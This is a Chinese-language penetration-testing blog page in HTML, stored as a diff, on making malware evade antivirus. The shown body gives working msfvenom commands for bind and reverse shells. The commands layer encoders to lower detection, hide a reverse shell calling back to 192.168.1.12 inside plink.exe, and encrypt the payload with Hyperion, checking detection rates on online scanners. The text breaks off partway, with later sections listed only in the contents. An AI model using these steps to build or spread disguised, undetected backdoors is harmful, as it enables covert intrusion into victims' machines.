@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀">
+<meta property="og:url" content="https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-03T14:54:00.000Z">
+<meta property="article:modified_time" content="2023-12-23T13:42:15.743Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="shell">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/","path":"2023/02/03/免杀/","title":"免杀"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>免杀 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E7%AE%80%E4%BB%8B"><span class="nav-text">1. 免杀简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6"><span class="nav-text">1、恶意软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="nav-text">2、防病毒软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="nav-text">3、免杀技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6"><span class="nav-text">4、当前现状</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfvenom%E5%B7%A5%E5%85%B7"><span class="nav-text">2. msfvenom工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90shell"><span class="nav-text">1、生成shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E9%9A%90%E8%97%8Fshell"><span class="nav-text">2、利用模板隐藏shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80"><span class="nav-text">3. 加密免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hyperion-32bit-pe-%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%99%A8"><span class="nav-text">1、Hyperion （32bit PE
+程序加密器）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kali%E8%87%AA%E5%B8%A6%E7%9A%84-hyperion%E6%8E%A8%E8%8D%90"><span class="nav-text">（1）kali自带的 Hyperion【推荐】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%B8%8D%E6%8E%A8%E8%8D%90"><span class="nav-text">（2）自己编译安装【不推荐】</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85wine"><span class="nav-text">2、安装wine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90shell-1"><span class="nav-text">3、生成shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86shell"><span class="nav-text">4、加密shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strings-%E5%AF%B9%E6%AF%94%E5%8A%A0%E5%AF%86%E5%89%8D%E5%90%8E%E5%8F%AF%E8%AF%BB%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">5、strings
+对比加密前后可读字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%AF%94"><span class="nav-text">6、在线病毒检测对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shell%E6%8E%A8%E8%8D%90"><span class="nav-text">4. 自己编写shell【推荐】</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-reverse-shell-%E7%A4%BA%E4%BE%8B"><span class="nav-text">1、Windows reverse shell 示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-reverse-shell-%E7%A4%BA%E4%BE%8B"><span class="nav-text">2、Linux reverse shell 示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#veil-%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7"><span class="nav-text">5. Veil 免杀工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-text">1、安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#veil-evasion-%E7%94%9F%E6%88%90-payload-%E6%BC%94%E7%A4%BA"><span class="nav-text">2、veil-evasion 生成 payload
+演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#veil-catapult%E4%BA%86%E8%A7%A3%E5%B7%B2%E5%81%9C%E6%9B%B4"><span class="nav-text">3、veil-catapult【了解，已停更】</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%89%B9%E5%BE%81%E7%A0%81%E5%85%8D%E6%9D%80"><span class="nav-text">6. 修改特征码免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellter-%E5%85%8D%E6%9D%80"><span class="nav-text">7. shellter 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-1"><span class="nav-text">1、安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA"><span class="nav-text">2、演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#backdoor-factorybdf%E5%85%8D%E6%9D%80"><span class="nav-text">8. backdoor-factory（BDF）免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">1、简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-%E4%BD%BF%E7%94%A8%E7%9A%84-patch-%E6%96%B9%E6%B3%95"><span class="nav-text">2、msf 使用的 patch 方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3"><span class="nav-text">（1）覆盖程序入口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%96%B0%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C-shellcode-%E5%B9%B6%E8%B7%B3%E5%9B%9E%E5%8E%9F%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3"><span class="nav-text">（2）创建新的线程执行
+shellcode 并跳回原程序入口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctp-%E6%96%B9%E6%B3%95"><span class="nav-text">3、CTP 方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="nav-text">4、实例演示</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%9F%BA%E4%BA%8E-python2-%E7%8E%AF%E5%A2%83"><span class="nav-text">（1）安装【基于 python2
+环境】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bdfproxy-%E5%85%8D%E6%9D%80"><span class="nav-text">9. Bdfproxy 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bdfproxy-%E5%AE%89%E8%A3%85"><span class="nav-text">1、bdfproxy 安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Earp%E6%AC%BA%E9%AA%97"><span class="nav-text">2、基于ARP欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E6%B5%81%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="nav-text">3、无线流量劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mana-%E5%AE%89%E8%A3%85"><span class="nav-text">（1）mana 安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA-1"><span class="nav-text">（2）演示</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="免杀 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          免杀
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-02-03 22:54:00" itemprop="dateCreated datePublished" datetime="2023-02-03T22:54:00+08:00">2023-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-23 21:42:15" itemprop="dateModified" datetime="2023-12-23T21:42:15+08:00">2023-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">Kail Linux渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index"><span itemprop="name">免杀</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>22 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="免杀简介">1. 免杀简介</h2>
+<h3 id="恶意软件">1、恶意软件</h3>
+<ul>
+<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
+<li>在用户非自愿的情况下执行安装</li>
+<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
+</ul>
+<h3 id="防病毒软件">2、防病毒软件</h3>
+<ul>
+<li><strong>恶意程序最主要的防护手段</strong></li>
+<li>杀毒软件/防病毒软件</li>
+<li>客户端/服务器/邮件防病毒</li>
+<li><strong>检测原理</strong></li>
+<li>基于二进制文件中特征签名的黑名单检测方法</li>
+<li>基于行为的分析方法（启发式）</li>
+<li><strong>事后手段</strong></li>
+<li>永远落后于病毒发展</li>
+</ul>
+<h3 id="免杀技术">3、免杀技术</h3>
+<ul>
+<li><strong>修改二进制文件中的特征字符</strong></li>
+<li>替换、擦除、修改</li>
+<li><strong>加密技术（crypter）</strong></li>
+<li>通过加密是的特征字符不可读，从而台币AV 检测</li>
+<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
+<li><strong>防病毒软件的检测</strong></li>
+<li>恶意程序本身的特征字符</li>
+<li>加密器 cripter 的特征字符</li>
+</ul>
+<h3 id="当前现状">4、当前现状</h3>
+<ul>
+<li><strong>恶意软件制造者</strong></li>
+<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
+<li>使用独有 crypter 软件加密恶意程序</li>
+<li>处事低调，尽量避免被发现</li>
+<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
+<li>Fully UnDetectable 还最高追求 （FUD）</li>
+<li><strong>AV 厂商</strong></li>
+<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
+<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
+<li>与恶意软件制造者永无休止的拉锯战</li>
+<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
+<li><strong>单一 AV 厂商的病毒库很难达到 100% 覆盖</strong></li>
+<li>https://www.virustotal.com/
+接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
+<li><strong>http://www.virscan.org/</strong></li>
+<li><strong>在线多引擎查杀网站与 AV 查杀共享信息</strong></li>
+<li><strong>在线多引擎查毒站</strong></li>
+<li>https://cn-sec.com/archives/552229.html</li>
+<li><strong>常用的 RAT 软件</strong></li>
+<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
+</ul>
+<h2 id="msfvenom工具">2. msfvenom工具</h2>
+<h3 id="生成shell"><strong>1、生成shell</strong></h3>
+<ul>
+<li><strong>生成未加密正向shell
+，lhost：目标机（靶机）IP，可不指定</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/ **bind_tcp** lhost=127.0.0.1 lport=4444 -a x86 --platform win -f exe -o test-1.exe</span><br><span class="line"><span class="comment">#-p 是payload  -a 目标机架构  -f 是生成的后门的格式  -o 是输出文件名</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125348597-1652951932.png" /></p>
+<ul>
+<li><strong>加密编码shell</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/bind_tcp lhost=192.168.1.12 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | </span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">&#x27;\x00&#x27;</span> -f exe -o test-2.exe</span><br><span class="line"><span class="comment">#-e 加密模块  -i 加密次数  -b 过滤掉特殊字符</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125425339-1546134190.png" /></p>
+<ul>
+<li><strong>可使用 strings 对比加密前后可读字符串</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125803621-144937208.png" /></p>
+<ul>
+<li><strong>比较编码前后的检测率：</strong><a
+target="_blank" rel="noopener" href="http://www.virscan.org/language/zh-cn/"
+class="uri">http://www.virscan.org/language/zh-cn/</a></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203131901344-1983284131.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203131919718-310995010.png" /></p>
+<h3 id="利用模板隐藏shell"><strong>2、利用模板隐藏shell</strong></h3>
+<p>也就是说通过将shell绑定到某些正常的软件（模板）上来隐藏自身。</p>
+<ul>
+<li><strong>未加密编码</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -a x86 --platform win -f exe -o test-3.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>加密编码</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe -o test-4.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>在线查毒对比</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203132844282-1413037400.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203132901569-164619933.png" /></p>
+<h2 id="加密免杀">3. 加密免杀</h2>
+<ul>
+<li><p>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</p></li>
+<li><p>常被恶意软件用于免杀目的</p></li>
+</ul>
+<h3 id="hyperion-32bit-pe-程序加密器">1、Hyperion （32bit PE
+程序加密器）</h3>
+<ul>
+<li>Crypter / Container（解密器 PE Loader ）</li>
+</ul>
+<h4 id="kali自带的-hyperion推荐">（1）kali自带的 Hyperion【推荐】</h4>
+<p><strong>位置：</strong> /usr/share/windows-resources/hyperion</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203193713358-1564104803.png" /></p>
+<h4 id="自己编译安装不推荐">（2）自己编译安装【不推荐】</h4>
+<ul>
+<li>下载：<a
+target="_blank" rel="noopener" href="https://github.com/nullsecuritynet/tools/blob/master/binary/hyperion/release/Hyperion-2.3.zip"
+class="uri">https://github.com/nullsecuritynet/tools/blob/master/binary/hyperion/release/Hyperion-2.3.zip</a></li>
+<li><strong>编译生成加密器</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151028476-206335.png" /></p>
+<ul>
+<li>若下载的是1.2版本可用以下命令生成</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o en.exe   <span class="comment"># -static-libgcc -static-libstdc++ 是exe执行会调用的动态库（此处是将这两个动态链接库静态编译进exe）</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151633625-1872506840.png" /></p>
+<ul>
+<li><strong>2.2，2.3版本可能的报错及解决方法</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151115635-2086677343.png" /></p>
+<p>将makefile第1行cc=后面的gcc替换成i686-w64-mingw32-gcc。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203150813046-603410208.png" /></p>
+<p>重新make即可。</p>
+<p>注意，这种方法生成的2.3版本的hyperion.exe在对shell加密时会出现以下问题，1.2版会出现动态链接库找不到的问题。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203181654911-1846085260.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203181850849-1120631449.png" /></p>
+<h3 id="安装wine">2、安装wine</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install wine  </span><br><span class="line"><span class="comment">#也可 dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 安装时间较长</span></span><br></pre></td></tr></table></figure>
+<h3 id="生成shell-1"><strong>3、生成shell</strong></h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe -o test-5.exe</span><br></pre></td></tr></table></figure>
+<h3 id="加密shell"><strong>4、加密shell</strong></h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine /usr/share/windows-resources/hyperion/hyperion.exe test-5.exe test-6.exe  <span class="comment">#用hyperion.exe加密test-5.exe生成test-6.exe</span></span><br></pre></td></tr></table></figure>
+<h3 id="strings-对比加密前后可读字符串">5、strings
